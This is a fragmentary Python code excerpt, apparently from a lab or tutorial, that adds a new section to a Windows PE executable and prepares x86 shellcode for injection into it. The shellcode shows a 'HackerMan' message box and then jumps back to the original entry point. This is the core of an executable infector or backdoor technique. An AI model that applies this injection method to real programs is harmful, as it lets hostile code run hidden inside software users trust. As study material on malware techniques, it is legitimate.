...
new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() +
                      40)
...
pe.set_bytes_at_offset(new_section_offset + 24, bytes(12 * '\x00', 'utf-8'))
...
payload = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                ...
                b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6e\x58\x20\x20\x68"
                b"\x65\x72\x4d\x61\x68\x48\x61\x63\x6b\x31\xdb\x88\x5c"
                b"\x24\x09\x89\xe3\x68\x49\x54\x21\x58\x68\x76\x65\x20"
                b"\x55\x68\x49\x20\x6c\x6f\x68\x48\x69\x2c\x20\x31\xc9"
                b"\x88\x4c\x24\x0f\x89\xe1\x31\xd2\x6a\x40\x53\x51\x52"
                b"\xff\xd0\xB8") + (oep + 0x400000).to_bytes(
                    4, byteorder="little") + bytes(b"\xFF\xD0")

#STEP 0x05 - Inject the Shellcode in the New Section
